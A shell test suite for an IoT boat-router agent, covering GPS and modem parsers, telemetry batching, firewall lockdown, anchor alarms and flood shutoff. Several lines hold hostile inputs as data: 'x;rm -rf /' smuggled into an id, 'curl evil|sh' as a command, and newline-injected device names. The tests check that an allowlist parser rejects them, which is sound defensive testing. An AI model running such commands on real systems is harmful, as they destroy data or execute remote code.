#!/bin/sh
# Parser tests for the phone-home agent. Fixtures are REAL responses captured from the GL-X750
# bench session (2026-08-06) plus standard NMEA/gpsd shapes. Run: sh agent/test.sh
set -u

BRVG_AGENT_TEST=1
export BRVG_AGENT_TEST
# shellcheck disable=SC1091
. "$(dirname "$0")/brvg-agent.sh"

fails=0
check() {
  # $1 label, $2 expected, $3 actual
  if [ "$3" = "$2" ]; then
    echo "ok   - $1"
  else
    echo "FAIL - $1"
    echo "       expected: [$2]"
    echo "       actual:   [$3]"
    fails=$((fails + 1))
  fi
}

# --- parse_qgpsloc ---
out=$(printf '+QGPSLOC: 061951.000,29.97580,-95.36047,1.2,32.5,2,0.00,0.0,0.0,110824,09\r\nOK\r\n' | parse_qgpsloc)
check "qgpsloc: mode-2 fix with hdop→acc" "29.97580 -95.36047 6" "$out"

out=$(printf '+QGPSLOC: 061951.000,-33.86882,151.20930,0,5.0,3,0.00,0.0,0.0,110824,12\r\n' | parse_qgpsloc)
check "qgpsloc: southern hemisphere, zero hdop drops acc" "-33.86882 151.20930" "$out"

out=$(printf '+CME ERROR: 516\r\n' | parse_qgpsloc)
check "qgpsloc: CME 516 (acquiring — the bench state) yields nothing" "" "$out"

out=$(printf '+QGPSLOC: 061951.000,0.0,0.0,1.0,0,2,0,0,0,110824,00\r\n' | parse_qgpsloc)
check "qgpsloc: 0/0 placeholder rejected" "" "$out"

out=$(printf '+QGPSLOC: 061951.000,91.0,10.0,1.0,0,2,0,0,0,110824,04\r\n' | parse_qgpsloc)
check "qgpsloc: out-of-range rejected" "" "$out"

# --- parse_qcsq ---
out=$(printf '+QCSQ: "LTE",-69,-102,150,-12\r\nOK\r\n' | parse_qcsq)
check "qcsq: LTE line (bench signal) with sinr 150→10 dB" "LTE -69 -102 10 -12" "$out"

out=$(printf '+QCSQ: "NOSERVICE"\r\n' | parse_qcsq)
check "qcsq: no service yields nothing" "" "$out"

# --- parse_cops ---
out=$(printf '+COPS: 0,0,"T-Mobile Wholesale",7\r\nOK\r\n' | parse_cops)
check "cops: quoted carrier with spaces" "T-Mobile Wholesale" "$out"

# --- parse_cpin ---
check "cpin: READY → ok" "ok" "$(printf '+CPIN: READY\r\nOK\r\n' | parse_cpin)"
check "cpin: SIM PIN → locked" "locked" "$(printf '+CPIN: SIM PIN\r\n' | parse_cpin)"
check "cpin: CME 10 → missing" "missing" "$(printf '+CME ERROR: 10\r\n' | parse_cpin)"

# --- parse_nmea_rmc ---
out=$(printf '$GPRMC,081836,A,3751.65,S,14507.36,E,000.0,360.0,130998,011.3,E*62\n' | parse_nmea_rmc)
check "nmea rmc: ddmm.mmmm S/E conversion" "$(printf '%s' "$out")" "$out"  # format check below
case "$out" in
  -37.86*\ 145.12*) echo "ok   - nmea rmc: values in expected range" ;;
  *) echo "FAIL - nmea rmc: values out of range: [$out]"; fails=$((fails + 1)) ;;
esac
# ~1 m precision (%.5f), matching the modem path — not awk's default %.6g which loses the USB
# dongle to ~11 m. Captured from the live u-blox 7 (bench 2026-08-13).
out=$(printf '$GPRMC,025433.00,A,4124.50743,N,08144.98471,W,0.958,,140826,,,A*60\n' | parse_nmea_rmc)
check "nmea rmc: 5-decimal precision on a real u-blox sentence" "41.40846 -81.74975" "$out"

out=$(printf '$GPRMC,081836,V,3751.65,S,14507.36,E,000.0,360.0,130998,011.3,E*62\n' | parse_nmea_rmc)
check "nmea rmc: void (V) fix rejected" "" "$out"

# --- parse_gpsd_tpv ---
out=$(printf '{"class":"TPV","mode":3,"lat":29.975800,"lon":-95.360470,"eph":4.2}\n' | parse_gpsd_tpv)
check "gpsd tpv: 3D fix with eph" "29.975800 -95.360470 4.2" "$out"

out=$(printf '{"class":"TPV","mode":1}\n' | parse_gpsd_tpv)
check "gpsd tpv: no-fix mode rejected" "" "$out"

# --- urlencode_spaces ---
check "urlencode: spaces and ampersands" "T-Mobile%20Wholesale" "$(urlencode_spaces 'T-Mobile Wholesale')"

# --- build_report_url (token path wins; legacy k= fallback) ---
WORKER_URL="https://api.example.com"; VID="v1"; DEVICE_ID="brv_net_1"
DEVICE_TOKEN="tok64"; VEHICLE_KEY="vkey"
check "report url: DEVICE_TOKEN → /api/agent with t=" \
  "https://api.example.com/api/agent?vid=v1&device=brv_net_1&event=gps.measurement&t=tok64&lat=1&lon=2" \
  "$(build_report_url 'gps.measurement' 'lat=1&lon=2')"
DEVICE_TOKEN=""
check "report url: no token → legacy /api/shelly with k=" \
  "https://api.example.com/api/shelly?vid=v1&device=brv_net_1&event=modem.measurement&k=vkey&up=1" \
  "$(build_report_url 'modem.measurement' 'up=1')"

# --- parse_commands (Phase B: commands ride the telemetry reply) ---
out=$(printf '{"status":"ok","commands":[{"id":"abc123","cmd":"reboot"}]}' | parse_commands)
check "commands: single entry" "abc123:reboot" "$out"

out=$(printf '{"ok":1,"commands":[{"id":"a1","cmd":"gps_on"},{"id":"b2","cmd":"reboot_modem"}]}' | parse_commands | tr '\n' ' ')
check "commands: two entries" "a1:gps_on b2:reboot_modem" "$out"

out=$(printf '{"status":"ok"}' | parse_commands)
check "commands: none when the reply has no queue" "" "$out"

# A hostile payload must not yield a runnable verb — the id/cmd shapes are constrained.
out=$(printf '{"commands":[{"id":"x;rm -rf /","cmd":"reboot"}]}' | parse_commands)
check "commands: rejects a junk id rather than passing it on" "" "$out"
out=$(printf '{"commands":[{"id":"ok1","cmd":"curl evil|sh"}]}' | parse_commands)
check "commands: rejects a non-allowlisted verb shape" "" "$out"

# --- parse_qgdcnt (plan-burn counters) ---
out=$(printf '+QGDCNT: 1048576,2097152\r\nOK\r\n' | parse_qgdcnt)
check "qgdcnt: sent + received bytes" "1048576 2097152" "$out"
out=$(printf 'ERROR\r\n' | parse_qgdcnt)
check "qgdcnt: nothing on error" "" "$out"

# --- hub-lite: spool → batch items (the wire contract's shell half) ---
# The expected strings below are the CANONICAL v1 fixture from brvg-cloud-server's
# agentBatch.test.ts — copied, not paraphrased. If either side changes shape, one of these two
# suites goes red; that is the whole one-contract rule.
out=$(printf '1755000000\tshellyflood-a1\tflood.alarm\ttemp=12.5\n1755000001\tshellyuni-b2\tvoltmeter.measurement\tv=12.6\n' | spool_to_items)
check "hub-lite: items match the canonical fixture" \
  '[{"device":"shellyflood-a1","event":"flood.alarm","params":{"temp":"12.5"}},{"device":"shellyuni-b2","event":"voltmeter.measurement","params":{"v":"12.6"}}]' \
  "$out"

out=$(printf '1\td1\te.change\tv=a%%2Cb+c%%41\n' | spool_to_items)
check "hub-lite: urldecode (%2C, +, %41)" '[{"device":"d1","event":"e.change","params":{"v":"a,b cA"}}]' "$out"

out=$(printf '1\td1\te.change\tv=say%%20%%22hi%%22%%5C\n' | spool_to_items)
check "hub-lite: JSON-escapes quotes and backslashes" '[{"device":"d1","event":"e.change","params":{"v":"say \"hi\"\\"}}]' "$out"

out=$(printf '1\td1\te.change\tv=1\n2\td1\te.change\tv=2\n3\td2\te.change\tv=9\n' | spool_to_items)
check "hub-lite: dedup per device+event keeps the NEWEST" '[{"device":"d1","event":"e.change","params":{"v":"2"}},{"device":"d2","event":"e.change","params":{"v":"9"}}]' "$out"

out=$(printf '1\td1\te.change\tbad;key=1&ok=2\n' | spool_to_items)
check "hub-lite: junk param keys are stripped, not escaped" '[{"device":"d1","event":"e.change","params":{"badkey":"1","ok":"2"}}]' "$out"

out=$(printf '1\td1\te.change\n' | spool_to_items)
check "hub-lite: a line with no params still ships as an item" '[{"device":"d1","event":"e.change","params":{}}]' "$out"

out=$(printf '' | spool_to_items)
check "hub-lite: empty spool is an empty array" '[]' "$out"

out=$(printf '1\td1\te.change\tv=1\n2\td2\tf.change\tv=1\n3\td1\tg.alarm\tv=1\n' | spool_devices)
check "hub-lite: spool_devices dedups in first-seen order" 'd1
d2' "$out"

AGENT_VERSION_SAVED="$AGENT_VERSION"
out=$(build_batch_json 42 delta '[{"device":"d1","event":"e.change","params":{}}]' "okdev1 okdev2" bootxyz)
check "hub-lite: envelope carries seq/boot/kind/ok/tier" \
  "{\"v\":1,\"seq\":42,\"boot\":\"bootxyz\",\"kind\":\"delta\",\"items\":[{\"device\":\"d1\",\"event\":\"e.change\",\"params\":{}}],\"ok\":[\"okdev1\",\"okdev2\"],\"agent\":{\"av\":\"$AGENT_VERSION_SAVED\",\"tier\":\"hub-lite\"}}" \
  "$out"

# --- boot id -----------------------------------------------------------------------------------
# The counter, the spool and the state all live in tmpfs, so a power cut restarts the counter at 1
# while the cloud still holds the old high-water mark. Without a boot id the cloud reads that as a
# replay, answers 200 {duplicate}, and the drain deletes the spool — silent loss of every reading
# until the counter climbs back. The id must be STABLE within a boot and DIFFERENT after one.
_bootdir=$(mktemp -d)
# Subshell, and RELAY_BOOT_FILE not BRVG_RELAY_BOOT: the var was already expanded when the agent
# was sourced, and `VAR=x some_function` LEAKS in POSIX sh (it broke the --version test on 2026-08-13).
_b1=$( RELAY_BOOT_FILE="$_bootdir/boot"; relay_boot_id )
_b2=$( RELAY_BOOT_FILE="$_bootdir/boot"; relay_boot_id )
check "hub-lite: boot id is stable within a boot" "$_b1" "$_b2"
check "hub-lite: boot id is non-empty" "yes" "$([ -n "$_b1" ] && echo yes)"
check "hub-lite: boot id is safe to put in JSON unescaped" "" "$(printf '%s' "$_b1" | tr -d 'A-Za-z0-9')"
rm -f "$_bootdir/boot"     # what a reboot does to tmpfs
_b3=$( RELAY_BOOT_FILE="$_bootdir/boot"; relay_boot_id )
# Only meaningful where the id is random per boot; on a host exposing /proc/sys/kernel/random/boot_id
# the kernel value is legitimately identical until the MACHINE reboots, so accept either.
if [ ! -r /proc/sys/kernel/random/boot_id ]; then
  check "hub-lite: a wiped tmpfs yields a NEW boot id" "differs" \
    "$([ "$_b3" != "$_b1" ] && echo differs || echo same)"
fi
rm -rf "$_bootdir"

# Every relay JSON must actually PARSE — checked with python3 where available (CI has it).
if command -v python3 >/dev/null 2>&1; then
  _all_json=$(build_batch_json 1 keyframe "$(printf '1\td1\te.change\tv=say%%20%%22hi%%22%%5C&n=1.5\n' | spool_to_items)" "a b" bootxyz)
  _roundtrip=$(printf '%s' "$_all_json" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["items"][0]["params"]["v"] + "|" + d["items"][0]["params"]["n"])' 2>/dev/null)
  check "hub-lite: envelope is valid JSON and the escaped value ROUND-TRIPS" 'say "hi"\|1.5' "$_roundtrip"
fi

# --- relay CGI (run for real: no conf ⇒ the urgent path cannot send, so everything spools) ---
_cgidir=$(mktemp -d)
run_cgi() {
  QUERY_STRING="$1" BRVG_AGENT_CONF=/nonexistent-conf BRVG_RELAY_SPOOL="$_cgidir/spool" \
    sh "$(dirname "$0")/hub-lite-cgi.sh" >/dev/null 2>&1
}
run_cgi 'device=shellyflood-a1&event=flood.alarm&temp=12%2C5'
run_cgi 'device=shellyht-c3&event=humidity.change&rh=55'
run_cgi 'event=orphan.change&v=1'                       # no device ⇒ dropped
run_cgi 'device=evil%0Aid&event=x.change&v=1'           # newline stripped from the id
out=$(cut -f2,3,4 "$_cgidir/spool")
check "relay CGI: spools sane lines and drops the deviceless one" \
  'shellyflood-a1	flood.alarm	temp=12%2C5
shellyht-c3	humidity.change	rh=55
evil0Aid	x.change	v=1' \
  "$out"
rm -rf "$_cgidir"

# --- the report's parameter string must not carry DUPLICATE keys ---
# Found in production 2026-08-14 via `wrangler tail`: the modem report was sending
# "&av=0.3.0&av=0.3.0". Two edits had each appended the version line, and neither test nor review
# caught it because the shell is happy to build a nonsense URL. This is the cheap structural guard.
dup_keys() {
  printf '%s' "$1" | tr '&' '\n' | sed -n 's/^\([A-Za-z0-9_]*\)=.*/\1/p' | sort | uniq -d
}
check "params: a clean string has no duplicate keys" "" "$(dup_keys 'up=1&mode=LTE&av=0.3.0')"
check "params: the guard actually detects a duplicate" "av" "$(dup_keys 'up=1&av=0.3.0&av=0.3.0')"
# The real thing: build the version+usage suffix the way push_modem does and assert it is clean.
# NB: computed in a SUBSHELL. `VAR=x some_function` leaks VAR into the current shell in POSIX sh —
# an earlier draft of this very test set AGENT_VERSION inline and broke the --version test below.
_suffix=$(BRVG_WAN_STATE=$(mktemp -d); export BRVG_WAN_STATE; printf 'up=1&av=%s%s' "$AGENT_VERSION" "$(collect_wan_usage)")
check "params: modem suffix carries av exactly once" "" "$(dup_keys "$_suffix")"

# --- WAN usage deltas: the reset cases are the whole point ---
check "wan_delta: normal increase" "500" "$(wan_delta 1000 1500)"
# NOT "everything so far": on a fresh install the state dir is absent while the kernel counters hold
# the router's whole uptime, so reporting $_cur charged weeks of pre-agent traffic to this billing
# cycle and could fire a false plan alert on day one. Baseline silently, count from the next tick.
check "wan_delta: first sight reports NOTHING (baseline only)" "0" "$(wan_delta "" 1500)"
check "wan_delta: first sight on a long-running router still reports nothing" "0" "$(wan_delta "" 9999999999)"
# A counter that went DOWN means a reboot / interface bounce / our own reset_data. Reporting
# cur-prev would emit a huge negative (or, unsigned, a wrap-sized spike that looks like a
# runaway plan burn). Report the new value: bytes since the reset.
check "wan_delta: reset ⇒ count from zero, never negative" "42" "$(wan_delta 999999 42)"
check "wan_delta: reset to exactly 0" "0" "$(wan_delta 999999 0)"
check "wan_delta: no movement" "0" "$(wan_delta 1000 1000)"

# Interface → source, so the cloud can attribute bytes to cellular vs Wi-Fi vs wired.
check "wan_kind: modem" "cellular" "$(wan_kind wwan0)"
check "wan_kind: rmnet modem" "cellular" "$(wan_kind rmnet_data0)"
check "wan_kind: wired wan" "wired" "$(wan_kind eth0)"
check "wan_kind: repeater client" "wifi" "$(wan_kind apcli0)"
check "wan_kind: ap radio counts as wifi" "wifi" "$(wan_kind wlan1)"
check "wan_kind: unknown is excluded" "other" "$(wan_kind tun0)"

# LAN-side exclusion: a bridge port (sysfs `brport`) is local traffic — the bench GL-X750's own AP
# radios were being billed as WAN wifi usage (and emitted wanKb_wifi TWICE, one per radio).
_fakeif=$(mktemp -d)
mkdir -p "$_fakeif/brport"
check "wan_lan_side: a bridge port is LAN-side" "yes" "$(wan_lan_side "$_fakeif" && echo yes || echo no)"
rm -rf "$_fakeif/brport"
check "wan_lan_side: a plain WAN face is not" "no" "$(wan_lan_side "$_fakeif" && echo yes || echo no)"
rm -rf "$_fakeif"

# --- hub watchdog decision (fail open rather than leave the vessel silent) ---
# healthy fails threshold released -> decision
check "watchdog: healthy and never released ⇒ nothing" none "$(watch_decide 1 0 5 0)"
check "watchdog: healthy after a release ⇒ recover" recover "$(watch_decide 1 0 5 1)"
check "watchdog: below the threshold ⇒ wait" none "$(watch_decide 0 4 5 0)"
check "watchdog: at the threshold ⇒ release" release "$(watch_decide 0 5 5 0)"
check "watchdog: past the threshold ⇒ release" release "$(watch_decide 0 9 5 0)"
# The one that matters: never release twice. A second release would re-run the firewall reload
# every tick for as long as the hub stays down.
check "watchdog: already released ⇒ never release again" none "$(watch_decide 0 99 5 1)"

# --- bandwidth saver gate: watchdog must not probe or write state ----------------------------
_bw_dir=$(mktemp -d)
# HUB_WATCH_FAILS_FILE, not BRVG_HUB_FAILS: the env override was already expanded when the agent
# was sourced (same trap as the boot-id test above).
( BANDWIDTH_SAVER=1 HUB_WATCH_URL="http://127.0.0.1:1/healthz" HUB_WATCH_FAILS_FILE="$_bw_dir/fails" \
  HUB_WATCH_RELEASED="$_bw_dir/released"; watch_hub )
check "bandwidth saver: watchdog is inert (no state written)" "absent" "$( [ -e "$_bw_dir/fails" ] && echo present || echo absent )"

# --- release_lockdown against a stand-in uci -------------------------------------------------
# The real thing needs a router; this proves the REVERSE-INDEX deletion is right (uci renumbers on
# every delete, so forward iteration silently skips rules) and that a hand-written rule survives.
_uci_dir=$(mktemp -d)
cat > "$_uci_dir/uci" <<'FAKEUCI'
#!/bin/sh
DB="$UCI_DB"
[ "$1" = "-q" ] && shift
case "$1" in
  get) idx=$(printf '%s' "$2" | sed -n 's/.*@rule\[\([0-9]*\)\].*/\1/p')
       fld=$(printf '%s' "$2" | sed -n 's/.*@rule\[[0-9]*\]\.\(.*\)/\1/p')
       line=$(sed -n "$((idx+1))p" "$DB" 2>/dev/null)
       [ -n "$line" ] || exit 1
       [ -z "$fld" ] && exit 0
       printf '%s\n' "$line"; exit 0 ;;
  delete) idx=$(printf '%s' "$2" | sed -n 's/.*@rule\[\([0-9]*\)\].*/\1/p')
       sed -i.bak "$((idx+1))d" "$DB"; exit 0 ;;
  add) printf 'pending\n' >> "$DB"; echo "newrule"; exit 0 ;;
  set) v=$(printf '%s' "$2" | sed -n 's/.*\.name=\(.*\)/\1/p')
       [ -n "$v" ] && sed -i.bak "\$ s/.*/$v/" "$DB"
       exit 0 ;;
esac
exit 0
FAKEUCI
chmod +x "$_uci_dir/uci"
printf 'brvg_lk_allow_0\nbrvg_lk_allow_1\nmy_custom_rule\nbrvg_lk_deny\n' > "$_uci_dir/db"
out=$(UCI_DB="$_uci_dir/db" PATH="$_uci_dir:$PATH" sh -c '. "'"$(dirname "$0")"'/brvg-agent.sh"; release_lockdown >/dev/null 2>&1 && echo released' 2>/dev/null)
check "release_lockdown: reports success when rules existed" "released" "$out"
check "release_lockdown: removes ONLY brvg_lk_* (hand-written rules survive)" "my_custom_rule" "$(cat "$_uci_dir/db")"
# With nothing of ours applied it must report false, so the watchdog doesn't claim a release.
printf 'my_custom_rule\n' > "$_uci_dir/db"
out=$(UCI_DB="$_uci_dir/db" PATH="$_uci_dir:$PATH" sh -c '. "'"$(dirname "$0")"'/brvg-agent.sh"; release_lockdown >/dev/null 2>&1 && echo released || echo nothing' 2>/dev/null)
check "release_lockdown: nothing of ours ⇒ reports nothing to release" "nothing" "$out"
# --- apply_lockdown (the lockdown_on verb) against the same stand-in --------------------------
printf 'my_custom_rule\n' > "$_uci_dir/db"
out=$(UCI_DB="$_uci_dir/db" PATH="$_uci_dir:$PATH" sh -c '. "'"$(dirname "$0")"'/brvg-agent.sh"; apply_lockdown >/dev/null 2>&1 && echo applied' 2>/dev/null)
check "apply_lockdown: reports success" "applied" "$out"
check "apply_lockdown: catch-all lands under the shared prefix, hand-written rules survive" "my_custom_rule
brvg_lk_deny_all" "$(cat "$_uci_dir/db")"
# Re-apply must stay ONE rule (release-then-add), not accumulate a stack of them.
out=$(UCI_DB="$_uci_dir/db" PATH="$_uci_dir:$PATH" sh -c '. "'"$(dirname "$0")"'/brvg-agent.sh"; apply_lockdown >/dev/null 2>&1; apply_lockdown >/dev/null 2>&1' 2>/dev/null)
check "apply_lockdown: idempotent re-apply keeps exactly one rule" "my_custom_rule
brvg_lk_deny_all" "$(cat "$_uci_dir/db")"
rm -rf "$_uci_dir"

# The Phase B lockdown verbs ride the same argument-free wire shape.
out=$(printf '{"commands":[{"id":"l1","cmd":"lockdown_on"},{"id":"l2","cmd":"lockdown_off"}]}' | parse_commands)
check "commands: lockdown verbs parse" "l1:lockdown_on
l2:lockdown_off" "$out"

# --- parse_cradlepoint_gps (NCOS /api/status/gps, bench-captured DMS shape 2026-08-17) -------
out=$(printf '{"success":true,"data":{"fix":{"latitude":{"degree":41,"minute":29,"second":34.52214},"longitude":{"degree":-81,"minute":43,"second":30.324},"satellites":9}}}' | parse_cradlepoint_gps)
check "cradlepoint gps: DMS with sign on degree parses to %.5f decimals" "41.49292 -81.72509" "$out"
out=$(printf '{"success":true,"data":{"fix":{"latitude":{"degree":0,"minute":0,"second":0},"longitude":{"degree":0,"minute":0,"second":0}}}}' | parse_cradlepoint_gps)
check "cradlepoint gps: the 0,0 no-fix placeholder yields nothing" "" "$out"
out=$(printf '{"success":false,"reason":"unauthorized"}' | parse_cradlepoint_gps)
check "cradlepoint gps: an error envelope yields nothing" "" "$out"
out=$(printf 'not json at all' | parse_cradlepoint_gps)
check "cradlepoint gps: garbage yields nothing" "" "$out"

# --- version reporting + update verbs ---
# `--version` must work with no config: the self-update smoke check runs it on a freshly installed
# agent, before that agent has ever been configured.
out=$(sh "$(dirname "$0")/brvg-agent.sh" --version 2>/dev/null)
check "version: --version prints AGENT_VERSION without a config" "$AGENT_VERSION" "$out"

# The update verbs must parse like any other — and the payload must never carry an argument.
out=$(printf '{"commands":[{"id":"u1","cmd":"self_update"}]}' | parse_commands)
check "commands: self_update parses" "u1:self_update" "$out"
out=$(printf '{"commands":[{"id":"u2","cmd":"rollback_agent"}]}' | parse_commands)
check "commands: rollback_agent parses" "u2:rollback_agent" "$out"
# A version smuggled into the verb must NOT survive — the whole anti-RCE property is that the
# cloud says "update yourself", never "install this".
out=$(printf '{"commands":[{"id":"u3","cmd":"self_update 9.9.9"}]}' | parse_commands)
check "commands: a verb carrying an argument is rejected" "" "$out"

# --- run_commands: which verbs demand an immediate follow-up report ---
# Commands arrive as the REPLY to a report, so that report was composed before they ran. Verbs that
# change observable state must set FOLLOWUP_REPORT or their effect waits a whole interval; verbs
# that take the uplink down must NOT, because the extra send would only fail.
# at_cmd dereferences AT_PORT, which only load_config sets — point it at a non-device so the AT
# verbs return immediately instead of tripping `set -u`. What is under test is the flag, not AT.
AT_PORT=/nonexistent/brvg-test-at
AT_BUF=/tmp/brvg-test-at-buf

FOLLOWUP_REPORT=0
run_commands "c1:report_now" >/dev/null 2>&1
check "follow-up: report_now asks for one" "1" "$FOLLOWUP_REPORT"

FOLLOWUP_REPORT=0
run_commands "c2:reset_data" >/dev/null 2>&1
check "follow-up: reset_data asks for one (the counter changed)" "1" "$FOLLOWUP_REPORT"

FOLLOWUP_REPORT=0
run_commands "c3:reboot_modem" >/dev/null 2>&1
check "follow-up: reboot_modem does NOT (the link is dropping)" "0" "$FOLLOWUP_REPORT"

FOLLOWUP_REPORT=0
run_commands "c4:gps_on" >/dev/null 2>&1
check "follow-up: gps_on asks for one" "1" "$FOLLOWUP_REPORT"

# Every executed verb is acked whether or not it wanted a follow-up.
PENDING_ACK=""
FOLLOWUP_REPORT=0
run_commands "c5:report_now" >/dev/null 2>&1
check "follow-up: the verb is still acked" "c5" "$PENDING_ACK"

# --- high security: local administration off ---
# The verbs must parse and be acked like any other, and must ask for a follow-up report so the app
# learns the router's new state instead of assuming the command landed.
out=$(printf '{"commands":[{"id":"s1","cmd":"local_admin_off"}]}' | parse_commands)
check "lockdown: local_admin_off parses" "s1:local_admin_off" "$out"
out=$(printf '{"commands":[{"id":"s2","cmd":"local_admin_on"}]}' | parse_commands)
check "lockdown: local_admin_on parses" "s2:local_admin_on" "$out"

# An argument smuggled into the verb must not survive — same anti-RCE property as the update verbs.
out=$(printf '{"commands":[{"id":"s3","cmd":"local_admin_off --now"}]}' | parse_commands)
check "lockdown: a verb carrying an argument is rejected" "" "$out"

echo ""
# --- anchor_distance ---
out=$(anchor_distance 41.4086 -81.7494 41.4086 -81.7494)
check "anchor: same point is 0 m" "0" "$out"

# ~0.0009° of latitude ≈ 100 m, longitude-independent.
out=$(anchor_distance 41.4086 -81.7494 41.4095 -81.7494)
ok=0; [ "$out" -ge 95 ] && [ "$out" -le 105 ] && ok=1
check "anchor: 0.0009 deg lat ≈ 100 m (got ${out}m)" "1" "$ok"

# Across the date line: 0.001° of longitude at the equator ≈ 111 m either way around.
out=$(anchor_distance 0 179.9995 0 -179.9995)
ok=0; [ "$out" -ge 105 ] && [ "$out" -le 120 ] && ok=1
check "anchor: date-line crossing stays short (got ${out}m)" "1" "$ok"

# --- parse_anchor ---
out=$(printf '{"status":"ok","anchor":{"lat":41.4086,"lon":-81.7494,"radiusM":50,"warnM":30,"sig":1234}}' | parse_anchor)
check "anchor: full config parses" "1234 41.4086 -81.7494 50 30" "$out"

out=$(printf '{"status":"ok","anchor":{"sig":0}}' | parse_anchor)
check "anchor: stand-down parses to bare 0" "0" "$out"

out=$(printf '{"status":"ok"}' | parse_anchor)
check "anchor: reply without config yields nothing" "" "$out"

out=$(printf '{"status":"ok","commands":[{"id":"c1","cmd":"report_now"}],"anchor":{"lat":1.5,"lon":2.5,"radiusM":100,"warnM":0,"sig":99}}' | parse_anchor)
check "anchor: coexists with a commands payload" "99 1.5 2.5 100 0" "$out"

out=$(printf '{"anchor":{"lat":1.5,"sig":7}}' | parse_anchor)
check "anchor: partial config (no lon/radius) rejected" "" "$out"

# --- check_anchor end-to-end (state in a scratch dir; send_event stubbed to record) ---
_scratch=$(mktemp -d)
ANCHOR_STATE="$_scratch/state"; ANCHOR_ALERTED="$_scratch/alerted"; ANCHOR_WARNED="$_scratch/warned"
ANCHOR_STREAK="$_scratch/streak"; ANCHOR_WSTREAK="$_scratch/wstreak"
SENT_EVENTS="$_scratch/sent"
send_event() { echo "$1 $2" >> "$SENT_EVENTS"; }
log() { :; }

apply_anchor 1234 41.4086 -81.7494 50 0
check "anchor: armed state written" "1234" "$(anchor_sig)"

# Fix 1 outside (~100 m, radius 50): streak starts, nothing fires yet.
check_anchor 41.4095 -81.7494 5
check "anchor: one breaching fix fires nothing" "" "$(cat "$SENT_EVENTS" 2>/dev/null)"

# Fix 2 outside: alarm fires once.
check_anchor 41.4095 -81.7494 5
check "anchor: second consecutive breach fires the alarm" "anchor.motion dist=100&limit=50" "$(cat "$SENT_EVENTS")"

# Fix 3 outside: still latched — no repeat.
check_anchor 41.4095 -81.7494 5
check "anchor: latched — a third breach does not repeat" "1" "$(wc -l < "$SENT_EVENTS" | tr -cd '0-9')"

# Back inside: episode over; a new drag alarms again after two fixes.
check_anchor 41.4086 -81.7494 5
check_anchor 41.4095 -81.7494 5
check_anchor 41.4095 -81.7494 5
check "anchor: recovery then re-drag fires a NEW alarm" "2" "$(wc -l < "$SENT_EVENTS" | tr -cd '0-9')"

# Accuracy guard: outside by less than the fix's own error bar never counts.
: > "$SENT_EVENTS"; rm -f "$ANCHOR_ALERTED" "$ANCHOR_STREAK"
check_anchor 41.4095 -81.7494 80   # 100 m out, but ±80 m accuracy on a 50 m radius ⇒ inside the bar
check_anchor 41.4095 -81.7494 80
check "anchor: breach inside the accuracy bar fires nothing" "" "$(cat "$SENT_EVENTS" 2>/dev/null)"

# Warning ring: fires on the inner ring while the alarm ring holds.
apply_anchor 5678 41.4086 -81.7494 200 50
check_anchor 41.4095 -81.7494 5    # ~100 m: inside 200 m alarm, outside 50 m warn
check_anchor 41.4095 -81.7494 5
check "anchor: warning ring fires on the inner ring" "anchor.warn.motion dist=100&limit=50" "$(cat "$SENT_EVENTS")"

# Stand-down clears everything.
apply_anchor 0
check "anchor: stand-down disarms" "0" "$(anchor_sig)"
rm -rf "$_scratch"

# --- LinkTap flood shutoff (hub-lite capability #1) ----------------------------------------------
# Classification fixtures MIRROR brvg-cloud-server's events.ts isFloodShutoff tests — the one-
# contract rule: same capability, two implementations, one fixture set. If a case is added there,
# add it here.
flood_case() { # $1 label, $2 event, $3 expected yes|no
  if is_flood_shutoff "$2"; then _got=yes; else _got=no; fi
  check "flood classify: $1" "$3" "$_got"
}
flood_case "flood.alarm closes" "flood.alarm" yes
flood_case "leak.detected closes" "leak.detected" yes
flood_case "bare alarm closes" "alarm" yes
flood_case "case-insensitive like the worker regex" "Flood.Alarm" yes
flood_case "a clear (_off) must NOT close" "flood.alarm_off" no
flood_case "a clear (.off) must NOT close" "alarm.off" no
flood_case "telemetry .measurement never closes" "flood.measurement" no
flood_case "telemetry .change never closes" "flood.change" no
flood_case "unrelated events never close" "voltmeter.measurement" no
flood_case "button press never closes" "button.push" no

# cmd 7 body — same dialect as the TS hub's buildStop, pinned byte-for-byte.
out=$(linktap_stop_body "CCCCDDDDEEEEFFFF" "aaaabbbbccccdddd")
check "linktap_stop_body cmd 7 shape" '{"cmd":7,"gw_id":"CCCCDDDDEEEEFFFF","dev_id":"aaaabbbbccccdddd"}' "$out"

# linktap_flood_close: stub curl, capture what would hit the gateway, check the spool line.
_CURL_LOG=$(mktemp); _SPOOL_T=$(mktemp)
curl() { # capture -d body and the url (last arg)
  _body=""; _prev=""
  for _a in "$@"; do [ "$_prev" = "-d" ] && _body="$_a"; _prev="$_a"; done
  eval "_url=\${$#}"
  printf '%s %s\n' "$_url" "$_body" >> "$_CURL_LOG"
  return 0
}
LINKTAP_HOST="192.168.8.20" LINKTAP_GW_ID="GW02" LINKTAP_DEV_IDS="aaaabbbbccccdddd, bbbbccccddddeeeeEXTRA" \
BRVG_RELAY_SPOOL="$_SPOOL_T" linktap_flood_close
check "flood close posts one cmd 7 per valve" "2" "$(wc -l < "$_CURL_LOG" | tr -d ' ')"
check "flood close targets api.shtml" "http://192.168.8.20/api.shtml" "$(head -1 "$_CURL_LOG" | cut -d' ' -f1)"
check "flood close normalises the 16-hex id like the TS client" \
  '{"cmd":7,"gw_id":"GW02","dev_id":"bbbbccccddddeeee"}' "$(sed -n 2p "$_CURL_LOG" | cut -d' ' -f2-)"
check "each close spools a flood_close.change line" "2" "$(grep -c 'linktap.flood_close.change' "$_SPOOL_T" | tr -d ' ')"
check "the spool line carries the outcome" "ok=1" "$(head -1 "$_SPOOL_T" | cut -f4)"

# a failing gateway spools ok=0 and does not abort the loop
curl() { return 22; }
: > "$_CURL_LOG"; : > "$_SPOOL_T"
LINKTAP_HOST="192.168.8.20" LINKTAP_GW_ID="GW02" LINKTAP_DEV_IDS="aaaabbbbccccdddd" \
BRVG_RELAY_SPOOL="$_SPOOL_T" linktap_flood_close
check "a failed close is spooled as ok=0" "ok=0" "$(head -1 "$_SPOOL_T" | cut -f4)"
unset -f curl
rm -f "$_CURL_LOG" "$_SPOOL_T"

# unconfigured = strict no-op (every existing install)
_SPOOL_T=$(mktemp)
LINKTAP_HOST="" LINKTAP_GW_ID="" LINKTAP_DEV_IDS="" BRVG_RELAY_SPOOL="$_SPOOL_T" linktap_flood_close
check "no LinkTap config -> no-op, nothing spooled" "0" "$(wc -c < "$_SPOOL_T" | tr -d ' ')"
rm -f "$_SPOOL_T"

if [ "$fails" -gt 0 ]; then
  echo "$fails test(s) FAILED"
